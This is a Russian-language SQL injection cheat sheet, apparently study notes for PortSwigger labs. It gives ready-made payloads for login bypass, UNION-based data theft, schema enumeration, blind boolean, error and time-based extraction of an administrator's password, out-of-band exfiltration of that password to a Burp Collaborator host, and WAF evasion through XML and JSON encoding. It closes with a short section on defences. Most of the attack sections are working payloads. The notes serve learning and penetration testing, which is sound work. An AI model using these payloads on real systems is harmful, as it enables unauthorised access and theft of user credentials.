# 💉 Шпаргалка по SQL-инъекциям

---

## 📚 Оглавление

1. [Что такое SQL-инъекция?](#-что-такое-sql-инъекция)
2. [Извлечение скрытых данных (WHERE)](#-1-извлечение-скрытых-данных-where)
3. [Обход аутентификации (Login Bypass)](#-2-обход-аутентификации-login-bypass)
4. [UNION-атака](#-3-union-атака)
5. [Анализ базы данных](#-4-анализ-базы-данных)
6. [Слепая SQL-инъекция](#-5-слепая-sql-инъекция)
   - [Boolean-based](#-51-boolean-based-условные-ответы)
   - [Error-based](#-52-error-based-инъекция-через-ошибки)
   - [Time-based](#-53-time-based-инъекция-через-задержки)
   - [OAST](#-54-oast-out-of-band-инъекция)
7. [Обход WAF через кодирование](#-6-обход-waf-через-кодирование)
8. [Как защититься](#-7-как-защититься-от-sql-инъекций)

---

## 🧠 Что такое SQL-инъекция?

**SQL-инъекция (SQLi)** — это уязвимость, при которой злоумышленник может «влезть» в SQL-запрос, который сайт отправляет в базу данных, и подменить его логику.

### 🎯 Что это даёт атакующему?
- 📖 **Читать** секретные данные (логины, пароли, номера карт).
- ✏️ **Изменять** или **удалять** данные.
- 💻 В редких случаях — **выполнять команды на сервере**.

### ❓ Почему это вообще возможно?
Сайт берёт то, что ввёл пользователь, и **напрямую вставляет в SQL-запрос**, не проверяя. Например:

```sql
SELECT * FROM users WHERE username = 'ВВОД_ПОЛЬЗОВАТЕЛЯ'
```

Если вместо имени ты введёшь `' OR 1=1--`, запрос превратится в:

```sql
SELECT * FROM users WHERE username = '' OR 1=1--'
```

И вернёт **всех** пользователей. Вот и вся магия. 🎩

---

## 🧩 Как читать эту шпаргалку

| Обозначение | Что значит |
|---|---|
| `'` | Одинарная кавычка — «разрывает» строку в SQL. |
| `--` | Комментарий в SQL (всё после него игнорируется). |
| `#` | Комментарий в MySQL. |
| `NULL` | Пустое значение (нужно для UNION). |
| `payload` | Полезная нагрузка — то, что ты вставляешь. |

> 💡 **Совет:** всегда пробуй на **легальных лабораториях** (PortSwigger Web Security Academy, DVWA, HackTheBox). Взламывать чужие сайты — статья. Серьёзно.

---

## ⚙️ 1. Извлечение скрытых данных (WHERE)

**Когда использовать:** когда на странице есть параметр, который попадает в `WHERE` запроса (например, `?id=1` или `?category=Gifts`).

### 🎯 Цель: заставить запрос вернуть все строки.

```sql
' OR 1=1--
```

**Как это работает:**
- `'` — закрываем строку, которую открыл сайт.
- `OR 1=1` — добавляем условие, которое **всегда истинно**.
- `--` — «съедаем» остаток запроса.

### 🕵️ Для слепой инъекции (когда ответ не видно):

```sql
' AND 1=1--   → истина (страница ведёт себя как обычно)
' AND 1=2--   → ложь (страница меняется)
```

Так ты проверяешь, есть ли вообще инъекция.

---

## 🔑 2. Обход аутентификации (Login Bypass)

**Когда использовать:** форма входа (логин + пароль).

### 🎯 Цель: войти без пароля.

**Варианты payload:**

```sql
admin' --
' OR 1=1; --
' OR 1=1 LIMIT 1; --
```

### 📖 Разбор на примере

Оригинальный запрос:
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = ''
```

Вводим в поле username:
```
administrator'--
```

Получаем:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Всё после `--` **игнорируется**, значит проверка пароля исчезла. 🎉

---

## 🧩 3. UNION-атака

**Когда использовать:** когда результат SQL-запроса **отображается на странице**.

> 🧠 **Идея:** UNION объединяет твой запрос с оригинальным. Ты приклеиваешь к результату свои данные.

### 📏 Шаг 1. Узнать количество колонок

Пробуем по очереди, пока не перестанет падать:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--   ← если упало, колонок = 3
```

Либо через UNION:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   ← работает → 3 колонки
```

### 🍎 Для Oracle

```sql
' UNION SELECT NULL FROM DUAL--
```

(В Oracle обязательно указывать `FROM DUAL`.)

### 🔤 Шаг 2. Найти «текстовые» колонки

Меняем `NULL` на `'a'` по одной позиции:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Если страница показывает `'a'` — эта колонка принимает **строки**. ✅

### 📥 Шаг 3. Вытащить данные

```sql
' UNION SELECT username, password FROM users--
```

### 🔗 Шаг 4. Склеить несколько значений в одну колонку

Если колонка одна, а вытащить надо два поля:

```sql
' UNION SELECT username || '~' || password FROM users--
```

**`||`** — конкатенация (склейка строк) в PostgreSQL, Oracle, SQLite.
**`CONCAT(a, b)`** — в MySQL и MSSQL.
**`+`** — в MSSQL.

Результат: `administrator~qwerty123`

---

## 🔍 4. Анализ базы данных

Прежде чем тащить данные, надо понять: **какая СУБД? какие таблицы? какие колонки?**

### 4.1 🏷️ Определение СУБД и версии

| СУБД | Запрос версии |
|---|---|
| **Microsoft SQL Server** | `SELECT @@version` |
| **MySQL** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **Oracle** | `SELECT * FROM v$version` |

Пример:
```sql
' UNION SELECT @@version--
```

### 4.2 📋 Список таблиц (кроме Oracle)

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**`information_schema.tables`** — системная таблица, где лежат **все** имена таблиц базы.

### 4.3 🗂️ Список колонок

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--
```

### 4.4 🏛️ Oracle — свои таблицы

| Что нужно | Запрос |
|---|---|
| Список таблиц | `SELECT * FROM all_tables` |
| Колонки | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |

> ⚠️ **Важно:** в Oracle имена таблиц и колонок хранятся **в верхнем регистре**. Пиши `'USERS'`, а не `'users'`.

Готовые payload'ы:
```sql
' UNION SELECT table_name, NULL FROM all_tables--
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
```

---

## 🕵️ 5. Слепая SQL-инъекция

**Слепая** — это когда сайт **не показывает** ни данные, ни ошибки. Ты видишь только: «ответ пришёл / не пришёл», «быстро / медленно».

Разберём 4 вида.

---

### 🎭 5.1 Boolean-based (условные ответы)

**Идея:** задаём True/False вопрос. Если ответ на странице меняется — условие истинно.

**Пример проверки:**
```sql
Cookie: TrackingId=xyz' AND '1'='1    → «Welcome back!» (истина)
Cookie: TrackingId=xyz' AND '1'='2    → ничего (ложь)
```

**Как вытащить пароль по буквам:**

```sql
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'), 1, 1) = 'm'--
```

→ Если увидел «Welcome back» → первая буква **m**.

**Проверка существования таблицы/юзера:**
```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

**Узнать длину пароля:**
```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
```

**Автоматизация:** Burp Intruder. Метки `§` вокруг символа — то, что Burp подставит:
```sql
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'), §1§, 1) = '§a§'--
```

---

### 💥 5.2 Error-based (инъекция через ошибки)

**Идея:** заставляем базу **выдать данные прямо в тексте ошибки**.

#### 📌 Тип 1. Условные ошибки (`CASE` + деление на ноль)

Если ответ `500` → символ угадан. Если `200` → мимо.

**PostgreSQL:**
```sql
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1
```

**Oracle:**
```sql
' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''
```

**MySQL:**
```sql
' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--
```

**MSSQL:**
```sql
' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1
```

#### 📌 Тип 2. Подробные ошибки (CAST) — вытащить всё сразу

**PostgreSQL:**
```sql
'||(SELECT password FROM users LIMIT 1)::int||'
```

**Oracle:**
```sql
'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'
```

**MySQL:**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**MSSQL:**
```sql
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
```

> 🧠 **Почему работает?** Ты пытаешься превратить текст в число → база ругается → в тексте ошибки видны данные.

#### ✂️ Что делать, если запрос обрезается

Сервер может резать длинные payload'ы. Экономь символы:

1. Убери лишний TrackingId — оставь только `'`.
2. `::int` короче, чем `CAST(... AS int)`.
3. Убери `LIMIT 1`, если точно одна строка.
4. `AND` короче, чем конкатенация `||`.
5. Не закрывай запрос комментарием `--` — закрывай строку через `||`.

---

### ⏱️ 5.3 Time-based (инъекция через задержки)

**Когда использовать:** сайт не показывает ни ошибок, ни изменений. Только по времени ответа видно, сработал ли запрос.

**Идея:** если условие истинно → БД «спит» 10 секунд.

**Как проверить:** засеки время ответа. 10 сек vs 0.5 сек.

#### 🧩 Шаблоны

**MSSQL:**
```sql
ТВОЙ_ID'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '0:0:10'--
```

**PostgreSQL:**
```sql
ТВОЙ_ID' ; SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

**MySQL:**
```sql
ТВОЙ_ID' AND IF(SUBSTR(password,1,1)='a', SLEEP(10), 0)--
```

**Oracle:**
```sql
ТВОЙ_ID'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM users WHERE username='administrator')||'
```

#### 📏 Узнать длину пароля
```sql
' ; SELECT CASE WHEN (LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```
Перебирай N=1, 2, 3... пока не появится задержка.

#### 🤖 Автоматизация в Burp Intruder

- **Sniper:** перебираем один символ за раз.
- **Cluster bomb:** перебираем сразу пары (позиция, символ).

Сортируй результат по **времени ответа** — где ~10 000 мс, там верный символ. ✅

---

### 🛰️ 5.4 OAST (Out-of-Band)

**Последний рубеж.** Когда не работает ничего: нет ошибок, нет изменений, нет задержек.

**Идея:** заставляем сервер БД отправить **внешний DNS/HTTP-запрос** на наш подконтрольный сервер (Burp Collaborator). Если запрос пришёл — уязвимость есть, и в поддомен можно засунуть данные.

**Инструменты:**
- **Burp Collaborator** (в Burp Suite Pro) — то, что нужно для лабораторий PortSwigger.
- Interactsh, oastify.com — альтернативы, но **не работают** в лабораториях PortSwigger.

#### Шаг 1. Проверка (безусловный запрос)

**MSSQL:**
```sql
'; exec master..xp_dirtree '//твой.burpcollaborator.net/a'--
```

**Oracle:**
```sql
'||UTL_INADDR.GET_HOST_ADDRESS('твой.burpcollaborator.net')||'
```

**PostgreSQL:**
```sql
'||dblink('host=твой.burpcollaborator.net user=test dbname=test', 'SELECT 1')||'
```

**MySQL:**
```sql
' AND LOAD_FILE(CONCAT('\\\\', 'твой.burpcollaborator.net', '\\a'))--
```

Если в Collaborator пришёл DNS-запрос → ✅ работает.

#### Шаг 2. Эксфильтрация данных

**MSSQL:**
```sql
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.твой.burpcollaborator.net/a"')--
```

**Oracle:**
```sql
'||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой.burpcollaborator.net')||'
```

**PostgreSQL:**
```sql
'||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой.burpcollaborator.net', 'SELECT 1')||'
```

**MySQL:**
```sql
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.твой.burpcollaborator.net', '\\a'))--
```

#### 📋 Быстрая проверка СУБД через задержки

| СУБД | Команда задержки 10 сек |
|---|---|
| MSSQL | `WAITFOR DELAY '0:0:10'` |
| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x', 10)` |
| PostgreSQL | `pg_sleep(10)` |
| MySQL | `SLEEP(10)` |

---

## 🛡️ 6. Обход WAF через кодирование

**WAF** (Web Application Firewall) ищет запрещённые слова: `SELECT`, `UNION`, `FROM` и т.д. Обход — **закодировать** часть букв так, чтобы WAF не узнал слово, но сервер раскодировал его перед SQL.

### 📍 Куда можно внедрять?
- Параметры URL (`?id=1`)
- Тело POST (формы, JSON, XML)
- HTTP-заголовки (`User-Agent`, `Cookie`)
- Имена загружаемых файлов
- Сообщения WebSocket

### 🔢 XML-кодирование (числовые сущности)

| Символ | Код |
|---|---|
| S | `&#x53;` |
| U | `&#x55;` |
| F | `&#x46;` |
| ' | `&apos;` или `&#x27;` |

**Пример payload в XML:**
```xml
<storeId>1 &#x55;NION &#x53;ELECT username || &apos;~&apos; || password &#x46;ROM users--</storeId>
```

### 🅰️ JSON-кодирование (Unicode)

| Символ | Код |
|---|---|
| S | `\u0053` |
| U | `\u0055` |

```json
{"storeId": "1 \u0055NION \u0053ELECT username FROM users"}
```

### 🧰 Hackvertor (расширение Burp)

Позволяет писать читаемый код, а расширение само кодирует:
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```

### ✅ Чек-лист XML-атаки

1. Перехвати запрос в Burp Suite — найди POST с XML.
2. Определи точку вставки (например, `<storeId>`).
3. Определи количество колонок через `UNION SELECT NULL, NULL...`
4. Закодируй ключевые слова (`U`, `S`, `F` → `&#x55;`, `&#x53;`, `&#x46;`).
5. Отправь и смотри на ответ.
6. Получил данные → победа. 🏆

---

## 🛡️ 7. Как защититься от SQL-инъекций

### ✅ Что делать

| Мера | Что это даёт |
|---|---|
| **Параметризованные запросы (Prepared Statements)** | Значения передаются отдельно от SQL — инъекция невозможна. |
| **Белый список** для имён таблиц/колонок/ORDER BY | Параметры не защищают структуру — только значения. |
| **ORM-библиотеки** | Автоматически экранируют данные. |
| **Регулярные аудиты** | Находят уязвимости до хакеров. |

### ❌ Чего НЕ делать
- Склеивать пользовательский ввод в строку запроса.
- Экранировать вручную — легко ошибиться.
- Доверять JSON/XML «потому что это не URL».
- Полагаться только на WAF — его обходят.

### ⚠️ Запомни
- Параметризация защищает **значения**, но не **структуру** (`ORDER BY`, имена таблиц).
- Разный синтаксис у разных СУБД: `||` vs `CONCAT`, `--` vs `#`.
- **Главное правило:** никогда не доверяй пользовательскому вводу.

---

### 🎓 Учебные ресурсы
- **PortSwigger Web Security Academy** — бесплатные лаборатории по SQLi. Начни здесь!
- **DVWA** (Damn Vulnerable Web App) — можешь развернуть локально.
- **HackTheBox**, **TryHackMe** — практика в песочнице.

### 🛠️ Инструменты
- **Burp Suite Community** — перехват запросов, Intruder, Repeater.
- **sqlmap** — автопентест SQLi (но сначала попробуй руками!).
- **Hackvertor** — расширение Burp для кодирования.

### 🔗 Шпаргалки
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

## 🧭 Мини-шпаргалка «что куда»

| Ситуация | Что пробовать |
|---|---|
| Форма входа | Login Bypass (`admin'--`) |
| Параметр в URL | UNION, Error-based |
| Ничего не видно | Boolean → Time → OAST |
| Есть ошибки | Error-based (CAST) |
| WAF блокирует | Кодирование (XML/JSON/Hackvertor) |

---
